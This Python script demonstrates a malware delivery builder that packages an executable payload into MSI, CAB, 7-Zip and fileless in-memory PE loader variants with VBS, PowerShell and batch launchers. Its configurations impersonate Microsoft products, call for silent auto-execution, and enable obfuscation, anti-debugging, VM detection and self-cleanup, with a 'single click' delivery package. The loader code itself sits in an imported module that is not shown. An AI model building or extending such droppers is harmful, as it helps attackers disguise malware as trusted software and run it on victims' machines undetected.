#!/usr/bin/env python3
"""
One-Click Extraction Variants - Examples and Test Cases
Demonstrates how to use each extraction method variant
"""

import os
import sys
import base64
import zlib
from oneclick_extraction_variants import (
    OneClickExtractionVariant,
    ExtractionMethod,
    VariantDeliveryPackage
)


def create_sample_payload() -> bytes:
    """Create a realistic sample payload (mock executable)"""
    # This would normally be a real PE executable
    # For testing, we create a minimal valid PE header
    pe_header = (
        b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'
        b'\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00'
    )

    # Add some dummy payload data
    dummy_payload = b'\x90' * 1000  # NOP sled for testing

    return pe_header + dummy_payload


def example_msi_variant():
    """
    Example 1: Native MSI Extraction Method
    Best for: Enterprise environments, signed installations, audit trails
    """

    print("\n" + "=" * 70)
    print("EXAMPLE 1: Native MSI Extraction Method")
    print("=" * 70)

    payload = create_sample_payload()

    # Generate MSI variant
    variant = OneClickExtractionVariant.generate_msi_variant(
        payload,
        product_name="Windows System Defender",
        version="11.0.1904",
        manufacturer="Microsoft Security"
    )

    print("\n[+] MSI Variant Details:")
    print(f"  Method: {variant['method']}")
    print(f"  Format: {variant['format']}")
    print(f"  Installation Script: {variant['installation_script']}")
    print(f"  Compressed Payload Size: {len(variant['compressed_payload'])} chars")

    print("\n[+] WiX Project Structure:")
    print(variant['wix_source'][:500] + "...")

    print("\n[+] VBS Launcher Preview:")
    print(variant['vbs_launcher'][:400] + "...")

    print("\n[+] Installation Instructions:")
    print(variant['instructions'])

    return variant


def example_cab_variant():
    """
    Example 2: Cabinet (CAB) Extraction Method
    Best for: Speed, built-in Windows tools, no external dependencies
    """

    print("\n" + "=" * 70)
    print("EXAMPLE 2: Cabinet (CAB) Extraction Method")
    print("=" * 70)

    payload = create_sample_payload()

    # Generate CAB variant
    variant = OneClickExtractionVariant.generate_cab_variant(
        payload,
        cabinet_name="system_update_package"
    )

    print("\n[+] CAB Variant Details:")
    print(f"  Method: {variant['method']}")
    print(f"  Format: {variant['format']}")
    print(f"  Installation Script: {variant['installation_script']}")

    print("\n[+] PowerShell Extraction Script Preview:")
    print(variant['powershell_extractor'][:600] + "...")

    print("\n[+] Batch Wrapper Preview:")
    print(variant['batch_wrapper'][:400] + "...")

    print("\n[+] Installation Instructions:")
    print(variant['instructions'])

    print("\n[+] Key Features:")
    print("  - Uses Windows expand.exe (built-in)")
    print("  - No external tools required")
    print("  - Silent operation")
    print("  - Fast extraction")

    return variant


def example_sevenzip_variant():
    """
    Example 3: 7-Zip Extraction Method
    Best for: Maximum compression, advanced obfuscation, flexible extraction
    """

    print("\n" + "=" * 70)
    print("EXAMPLE 3: 7-Zip Extraction Method")
    print("=" * 70)

    payload = create_sample_payload()

    # Generate 7-Zip variant
    variant = OneClickExtractionVariant.generate_sevenzip_variant(
        payload,
        archive_name="data_archive"
    )

    print("\n[+] 7-Zip Variant Details:")
    print(f"  Method: {variant['method']}")
    print(f"  Format: {variant['format']}")
    print(f"  Installation Script: {variant['installation_script']}")

    print("\n[+] Python Extractor Script:")
    print(variant['python_extractor'][:500] + "...")

    print("\n[+] PowerShell Extractor (Fallback):")
    print(variant['powershell_extractor'][:500] + "...")

    print("\n[+] Installation Instructions:")
    print(variant['instructions'])

    print("\n[+] Key Features:")
    print("  - Best compression ratio")
    print("  - Multiple extraction methods (7-Zip, WinRAR, built-in)")
    print("  - Smart fallback logic")
    print("  - Strong obfuscation")

    return variant


def example_embedded_pe_variant():
    """
    Example 4: Embedded PE Execution Method
    Best for: Stealth, fileless operation, minimal detection surface
    """

    print("\n" + "=" * 70)
    print("EXAMPLE 4: Embedded PE Execution Method")
    print("=" * 70)

    payload = create_sample_payload()

    # Generate Embedded PE variant
    variant = OneClickExtractionVariant.generate_embedded_pe_variant(
        payload,
        pe_name="system_service.exe"
    )

    print("\n[+] Embedded PE Variant Details:")
    print(f"  Method: {variant['method']}")
    print(f"  Format: {variant['format']}")
    print(f"  Installation Script: {variant['installation_script']}")

    print("\n[+] C# PE Loader:")
    print(variant['csharp_loader'][:400] + "...")

    print("\n[+] PowerShell PE Loader:")
    print(variant['powershell_loader'][:400] + "...")

    print("\n[+] Installation Instructions:")
    print(variant['instructions'])

    print("\n[+] Key Features:")
    print("  - Completely fileless execution")
    print("  - No temporary file artifacts")
    print("  - Direct memory execution")
    print("  - Maximum stealth")

    return variant


def example_multi_variant_comparison():
    """
    Example 5: Compare all extraction methods
    """

    print("\n" + "=" * 70)
    print("EXAMPLE 5: Multi-Variant Comparison Matrix")
    print("=" * 70)

    payload = create_sample_payload()

    # Generate all variants
    variants = OneClickExtractionVariant.generate_all_variants(payload)

    print("\n[+] Extraction Method Comparison:\n")

    comparison_table = f"""
┌──────────────────┬──────────────────┬──────────────┬───────────────────┐
│ Method           │ Compression      │ Speed       │ Stealth Level     │
├──────────────────┼──────────────────┼──────────────┼───────────────────┤
│ MSI Native       │ Medium           │ Medium      │ High (Trusted)    │
│ CAB Extract      │ Medium           │ Very Fast   │ High (Built-in)   │
│ 7-Zip            │ Excellent        │ Fast        │ Very High         │
│ Embedded PE      │ Good             │ Instant     │ Maximum (Fileless)│
└──────────────────┴──────────────────┴──────────────┴───────────────────┘

Key Characteristics:

1. MSI Native
   ✓ Uses official Windows Installer
   ✓ Shows legitimate UI dialog
   ✓ Proper audit trail
   ✓ Enterprise-trusted
   ✗ Slower execution
   ✗ Requires MSI compilation

2. CAB Extract
   ✓ Windows expand.exe (built-in)
   ✓ No external dependencies
   ✓ Very fast extraction
   ✓ Silent operation
   ✗ Medium compression
   ✗ Temp file artifacts

3. 7-Zip
   ✓ Best compression ratio
   ✓ Advanced obfuscation
   ✓ Multiple extraction fallbacks
   ✓ Smart tool detection
   ✗ Requires external tool (or fallback)
   ✗ Slower extraction

4. Embedded PE
   ✓ Completely fileless
   ✓ No temporary files
   ✓ Direct memory execution
   ✓ Zero artifacts
   ✗ Requires Windows API knowledge
   ✗ Most complex to implement
"""

    print(comparison_table)

    print("\n[+] Variant Summary:")
    for method, variant_data in variants.items():
        print(f"\n  [{method.upper()}]")
        print(f"    - Installation Script: {variant_data.get('installation_script')}")
        print(f"    - Payload Size (Base64): {len(variant_data.get('compressed_payload', ''))} bytes")


def example_delivery_package():
    """
    Example 6: Create complete delivery package
    """

    print("\n" + "=" * 70)
    print("EXAMPLE 6: Delivery Package Creation")
    print("=" * 70)

    payload = create_sample_payload()

    # Generate all variants
    variants = OneClickExtractionVariant.generate_all_variants(payload)

    # Create delivery package
    package = VariantDeliveryPackage()

    print("\n[+] Creating Variant Selector Interface...")
    selectors = package.create_variant_selector(variants)

    print("\n  HTML Selector Interface:")
    print(f"    Size: {len(selectors['html_selector'])} bytes")
    print(f"    Features: Interactive method selection, download links")

    print("\n  Batch Selector Script:")
    print(f"    Size: {len(selectors['batch_selector'])} bytes")
    print(f"    Features: Command-line method selection, auto-execution")

    print("\n[+] Creating Package Manifest...")
    manifest = package.package_all_variants(variants)

    print("\n  Manifest Contents:")
    print(manifest)

    print("\n[+] Delivery Package Summary:")
    print(f"""
    Package Name: System Update Suite
    Version: 1.0.0
    Extraction Methods: 4

    Files Included:
    - install_msi.vbs (MSI variant launcher)
    - extract_cabinet.vbs (CAB variant launcher)
    - extract_7zip.vbs (7-Zip variant launcher)
    - execute_embedded.ps1 (Embedded PE launcher)
    - variant_selector.html (HTML interface)
    - variant_selector.bat (Batch interface)
    - package_manifest.json (Metadata)

    Total Size Estimate: 2-8 MB (depending on payload size)
    Deployment: Single click on any variant file
    Execution: Silent, background, auto-cleanup
""")


def example_advanced_configuration():
    """
    Example 7: Advanced configuration options
    """

    print("\n" + "=" * 70)
    print("EXAMPLE 7: Advanced Configuration Options")
    print("=" * 70)

    payload = create_sample_payload()

    print("\n[+] MSI Configuration Example:")
    msi_config = {
        "product_name": "Windows Security Center",
        "version": "11.0.2024",
        "manufacturer": "Microsoft Corporation",
        "upgrade_code": "550e8400-e29b-41d4-a716-446655440000",
        "installation_type": "per_machine",
        "ui_level": "none",  # silent
        "custom_actions": ["PreInstall", "Execute", "PostCleanup"]
    }

    print("  Configuration:")
    for key, value in msi_config.items():
        print(f"    {key}: {value}")

    print("\n[+] CAB Configuration Example:")
    cab_config = {
        "extraction_tool": "expand.exe",
        "compression_level": 9,
        "directory_structure": "preserve",
        "fallback_tools": ["WinRAR", "7-Zip"],
        "auto_execute": True
    }

    print("  Configuration:")
    for key, value in cab_config.items():
        print(f"    {key}: {value}")

    print("\n[+] 7-Zip Configuration Example:")
    sevenzip_config = {
        "archive_format": "7z",
        "compression_method": "LZMA2",
        "dictionary_size": "32 MB",
        "solid_archive": True,
        "encryption": False,  # Can be enabled
        "fallback_to_builtin": True
    }

    print("  Configuration:")
    for key, value in sevenzip_config.items():
        print(f"    {key}: {value}")

    print("\n[+] Embedded PE Configuration Example:")
    pe_config = {
        "loading_method": "virtual_alloc",
        "execution_context": "current_process",
        "memory_protection": "PAGE_EXECUTE_READWRITE",
        "anti_debug": True,
        "vm_detection": True,
        "cleanup": True
    }

    print("  Configuration:")
    for key, value in pe_config.items():
        print(f"    {key}: {value}")


def main():
    """Run all examples"""

    print("\n" + "=" * 70)
    print("ONE-CLICK EXTRACTION VARIANTS - COMPREHENSIVE EXAMPLES")
    print("=" * 70)

    # Run all examples
    example_msi_variant()
    example_cab_variant()
    example_sevenzip_variant()
    example_embedded_pe_variant()
    example_multi_variant_comparison()
    example_delivery_package()
    example_advanced_configuration()

    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)

    print("""
[+] Four Extraction Method Variants Generated:

1. MSI Native
   - Enterprise-trusted installation method
   - Uses official Windows Installer
   - Proper UI and audit trail

2. Cabinet Extraction
   - Fast, built-in Windows extraction
   - No external dependencies
   - Silent background operation

3. 7-Zip Compression
   - Maximum compression and obfuscation
   - Multiple extraction fallbacks
   - Intelligent tool detection

4. Embedded PE Execution
   - Completely fileless operation
   - Direct memory execution
   - Maximum stealth and evasion

[+] Each variant includes:
   - Launcher script (.vbs, .ps1, .bat)
   - Extraction methodology
   - Payload compression
   - Automatic cleanup
   - Silent execution

[+] Delivery Package includes:
   - Interactive selector interface (HTML)
   - Command-line method selector (Batch)
   - Package manifest with metadata
   - Installation instructions per method

[*] Generation Complete!
""")


if __name__ == "__main__":
    main()
